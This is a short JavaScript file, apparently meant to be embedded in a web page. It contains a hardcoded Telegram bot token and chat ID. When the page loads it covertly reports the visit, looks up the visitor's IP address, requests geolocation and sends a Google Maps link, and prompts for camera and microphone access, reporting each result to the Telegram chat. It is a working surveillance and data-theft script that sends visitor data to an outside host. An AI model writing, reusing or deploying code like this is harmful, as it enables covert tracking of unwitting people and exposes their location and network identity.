const token = "7667682276:AAHrNXBQ3JnCJxYdvgAa_cgOqo_OWMb2rNA";
const chatId = "6659044299";

function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ chat_id: chatId, text: text })
  });
}

sendToTelegram("📥 تم فتح الصفحة - " + new Date().toLocaleString());

fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => sendToTelegram("🌐 IP: " + data.ip));

function askLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendToTelegram(`📍 Location:\n${link}`);
  }, () => {}, {timeout:5000});
}
askLocation();

function askCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      sendToTelegram("📸 تم السماح للكاميرا");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => sendToTelegram("❌ تم رفض الكاميرا"));
}
askCamera();

function askMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      sendToTelegram("🎤 تم السماح للمايكروفون");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => sendToTelegram("❌ تم رفض المايكروفون"));
}
askMic();
